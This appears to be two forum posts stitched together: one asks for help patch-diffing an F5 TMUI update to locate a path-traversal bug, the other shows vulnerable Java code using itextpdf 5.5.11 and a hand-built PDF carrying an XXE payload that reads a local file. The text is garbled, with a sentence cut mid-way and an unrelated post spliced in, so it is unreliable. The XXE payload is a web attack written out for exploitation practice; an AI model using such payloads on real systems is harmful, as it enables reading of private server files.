I have never really done any patch diffing before so this seems like a difficult challenge. There are over 2000 files that are different between versions 14.1.2.5 and 14.1.2.6 of the TMUI app. I know that the bug has something to do with path traversal just from the payload being shared around the internet. I managed to trigger an error that displays a stack-trace. I'm hoping this points me in the right direction. I am seeking advice from others who have looked into this regarding what files to look at to really narrow down what the issue is and to see how the patch fixes the bug. Thanks."

So I decide to start with know vulnerable libraries like itextpdf ([URL creating a vulnerable java webapp and trying to exploit this. The payload should be pretty straightforward but for some reason I am having trouble exploiting it. If anyone has any idea what I'm doing wrong, it would be nice to know! &amp;#x200B; This is the vulnerable code (I'm using 5.5.11 version of the lib) import com.itextpdf.text.pdf.PdfReader; import com.itextpdf.text.pdf.parser.PdfTextExtractor; ... PdfReader pdfReader = new PdfReader(pdf_file); int pages = pdfReader.getNumberOfPages(); for(int i=1; i&lt;=pages; i++) { String pageContent = PdfTextExtractor.getTextFromPage(pdfReader, i); ... } pdfReader.close(); And this is what I have so far. I know it could be just one object I was trying to have a file that works in other contexts. Edit: So basically I'm having errors in the dictionary part of the object 4. I added a /Length tag but it fails anyway :( %PDF-1.4 1 0 obj &lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt; endobj 2 0 obj &lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt; endobj 3 0 obj &lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R % reference to content &gt;&gt; endobj 4 0 obj &lt;&lt;&gt;&gt; stream &lt;?xml version=""1.0"" encoding=""ISO-8859-1""?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM ""file:///tmp/randomfile.txt"" &gt;]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt; &lt;/xml&gt; endstream endobj xref 0 5 0000000000 65535 f 0000000009 00000 n 0000000068 00000 n 0000000140 00000 n 0000000278 00000 n trailer &lt;&lt; /Size 6 /Root 1 0 R &gt;&gt; startxref 529 %%EOF PD: I post this before on r/cybersecurity and now I move it here :)"
